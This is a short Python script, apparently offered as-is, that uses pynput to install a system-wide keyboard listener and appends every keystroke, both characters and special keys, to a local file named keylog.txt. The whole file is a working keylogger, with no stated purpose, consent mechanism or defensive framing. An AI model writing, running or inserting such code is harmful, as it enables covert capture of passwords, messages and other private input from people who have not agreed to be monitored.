from pynput.keyboard import Key, Listener

# Log file path
log_file = "keylog.txt"

# Function to write to the log file
def log_key(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}\n")  # For regular keys
    except AttributeError:
        # Special keys like space, enter, etc.
        with open(log_file, "a") as f:
            f.write(f"{key}\n")  # Log special keys

# Start listener
def on_press(key):
    log_key(key)

# Setting up the listener
with Listener(on_press=on_press) as listener:
    listener.join()
